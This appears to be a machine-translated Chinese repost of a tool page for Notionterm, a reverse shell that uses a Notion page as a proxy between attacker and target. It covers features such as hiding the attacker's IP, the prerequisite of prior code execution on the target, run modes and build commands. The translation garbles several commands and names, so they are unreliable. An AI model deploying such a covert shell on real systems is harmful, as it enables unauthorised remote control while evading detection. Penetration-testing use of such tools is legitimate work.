# Notionterm:在概念页面中嵌入反向外壳

> 原文：<https://kalilinuxtutorials.com/notionterm/>

[![](img/a1fcf43a8a0f39a7709deeca5cc9d2a0.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjunMsXl6yUYs5PD_cAsI4DiqZAhB0Iz6gPe9Xlakp6snCAXXdTNWghOB8ehQaCJIBxcHqGx31qpSK-eyhsXF_rdOFhXACk3FMGnHjHmUSa6FFuCHt4gTo0J-n7e7jH-MBzMR6_1ED4YFIfrS5JeVXJ43OovqlzaTPYl-Zt3RtobVxzoeK-VtsqjOBH/s728/notionterm%20(1).png)

Notionterm 是在概念页面中嵌入的反向外壳

*   在反向外壳中隐藏攻击者 IP*(攻击者和目标机器之间没有直接交互。概念被用作托管反向外壳的代理)*
*   演示/在报告中快速插入证据
*   高可用性和可共享的反向外壳(桌面、浏览器、移动)
*   加密和认证的远程外壳

重点是在保持可用性的同时制造一些有趣的东西，但这并不意味着是 pentester 的军火库中 reverse shell 的解决方案

### 要求

*   概念软件和 API 密钥
*   允许从目标到概念域的 HTTP 通信
*   目标前 RCE

### 设置

*   创建一个页面，并向集成 API 键授予页面写访问权限
*   构建`**notionterm**`并将其转移到目标机器上(参见安装)

### 奔跑

运行`**notionterm**`有 3 种主要方式:**【正常】模式**
*获取终端、停止/取消停止等……*`**notionterm [flags]**`
用按钮小部件启动 shell:转动`**ON**`，是否反转 shell 内容，转动`**OFF**`暂停，转动`**ON**`继续等……**“服务器”模式**
*轻松将 notionterm 嵌入任何页面* `**notionterm --server [flags]**`
通过创建在任何页面启动 shell 会话`light`模式
*仅执行来自目标的 HTTP 流量→观念* `**notionterm light [flags]**`

## 安装

因为`**notionterm**`的目标是在目标机器上运行，所以它的构建必须与之相适应。

因此，设置环境变量以符合目标要求:

**GOOS =【windows/Linux/Darwin】**

**简单构建**

**git 克隆 https://github.com/ariary/notionterm.git&&CD not ionterm
GOOS = $ GOOS go 构建 notionterm.go**

您需要使用环境变量(`**NOTION_TOKEN**` & `**NOTION_PAGE_URL**`)或标志(`**--token**` & `**--page-url**`)来设置 API 键和概念页面 URL

### “包罗万象”的构建

在二进制文件中直接嵌入概念集成 API 令牌和概念页面 url。 *⚠️每个有权访问二进制文件的人都可以取回令牌。出于安全原因，不要共享它，并在使用后删除它。*

根据环境变量设置:

**导出概念页面 URL =[概念页面 URL]
导出概念令牌=[集成概念令牌]**

建造它:

**git 克隆 https://github.com/ariary/notionterm.git&&CD not onterm
。/static-build . sh $ idea _ PAGE _ URL $ idea _ TOKEN $ GOOS go build notionterm . go**

[**Download**](https://github.com/ariary/notionterm)